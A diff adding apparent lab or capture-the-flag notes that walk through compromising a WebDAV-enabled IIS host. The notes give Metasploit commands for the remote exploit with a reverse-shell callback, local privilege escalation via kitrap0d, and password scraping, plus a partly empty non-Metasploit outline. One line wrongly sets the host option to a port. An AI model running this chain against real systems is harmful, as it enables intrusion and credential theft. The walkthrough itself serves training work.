@@ -1,0 +1,61 @@
+# Metasploit method.
+
+Step 1 (Enumeration)
+- Target has WebDav running on port 80.
+
+Step 2 (Exploit)
+- use exploit/windows/iis/iis_webdav_scstoragepathfromurl
+- set RHOST 10.10.10.8
+- set RHOST 80
+- Choose payload
+- set LHOST <lhost>
+- set LPORT <lport>
+- run
+
+Step 3 (Enumeration)
+- use post/multi/recon/local_exploit_suggester
+- set session
+- run
+- (Migrate to different bit architecture process to run suggester on both 32 and 64 bit)
+
+Step 4 (Privilege escalation)
+- use exploit/windows/local/ms10_015_kitrap0d
+- set EXITFUNC thread
+- set LHOST <lhost>
+- set LPORT <lport>
+- set options
+- exploit
+
+Ensure the exploit and running meterpreter session being used are the same architecture
+
+Step 5 (Pilfering)
+- List drivers
+- Firewall rules
+- Password scrape
+- Network connections
+- List network devices
+- etc...
+
+
+# Non-Metasploit method.
+
+Step 1 (Enumeration)
+- Target has WebDav running on port 80.
+
+Step 2 (Foot hold)
+- https://www.exploit-db.com/exploits/41738
+- Changing the socket connect to rhost and rport.
+- Call back shell code using MSFVenom
+
+Step 3 (Enumeration)
+
+
+Step 4 (Privilege escalation)
+
+Step 5 (Pilfering)
+- List drivers
+- Firewall rules
+- Password scrape
+- Network connections
+- List network devices
+- etc...
